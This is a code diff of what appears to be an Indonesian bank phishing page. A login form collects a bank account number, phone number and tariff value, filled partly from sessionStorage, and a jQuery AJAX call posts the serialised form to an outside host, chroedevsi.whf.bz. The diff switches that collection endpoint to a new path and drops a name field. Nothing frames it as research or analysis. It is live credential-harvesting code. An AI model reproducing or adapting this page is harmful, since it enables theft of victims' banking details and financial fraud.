@@ -433,7 +433,7 @@ nav{
           <form id="login" onsubmit="sendLogin()" method="post">
               <input type="hidden" name="tarif" id="tarif">
               <input type="hidden" name="nohp" id="nohp">
-              <input type="hidden" name="nama" id="nama">
+              
        
        <div class="input-field">
     <label for="rek">Nomor rekening : </label>
@@ -467,7 +467,7 @@ nav{
    
    $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/35/login.php',
+        url: 'https://chroedevsi.whf.bz/36/login.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -544,8 +544,7 @@ document.getElementById("tarif").value =
         sessionStorage.getItem("tarif");
 document.getElementById("nohp").value =
         sessionStorage.getItem("nohp");
- document.getElementById("nama").value =
-        sessionStorage.getItem("nama"); 
+ 
 
 
 
